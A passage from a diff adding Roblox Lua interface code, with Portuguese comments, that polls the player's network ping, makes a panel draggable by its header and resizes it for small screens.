+        if lp.GetNetworkPing then
+            local ok, val = pcall(function() return lp:GetNetworkPing() end)
+            if ok and val and val > 0 then return val * 1000 end
+        end
+        return 0
+    end
+
+    while true do
+        task.wait(1)
+        local pingMs = getPingValue()
+        if pingMs > 0 then
+            currentPing = pingMs / 1000
+        end
+    end
+end)
+
+-- ===== DRAG (usa headerFrame como handle) =====
+local dragging = false
+local dragStart
+local startPosition
+
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    panel.Position = UDim2.new(
+        startPosition.X.Scale,
+        startPosition.X.Offset + delta.X,
+        startPosition.Y.Scale,
+        startPosition.Y.Offset + delta.Y
+    )
+end
+
+headerFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPosition = panel.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch) then
+        updateDrag(input)
+    end
+end)
+
+-- ===== RESPONSIVO =====
+local function adaptToScreen()
+    local camera = workspace.CurrentCamera
+    if not camera then return end
+    local viewport = camera.ViewportSize
+    if viewport.X < 700 then
+        if not minimized then
+            panel.Size = UDim2.new(0, math.min(BASE_W, viewport.X - 28), 0, BASE_H)
+        end
+        panel.Position = UDim2.new(0, 14, 0.5, 0)
+    end
+end
+
+adaptToScreen()
+if workspace.CurrentCamera then
+    workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(adaptToScreen)
+end
+
+return gui
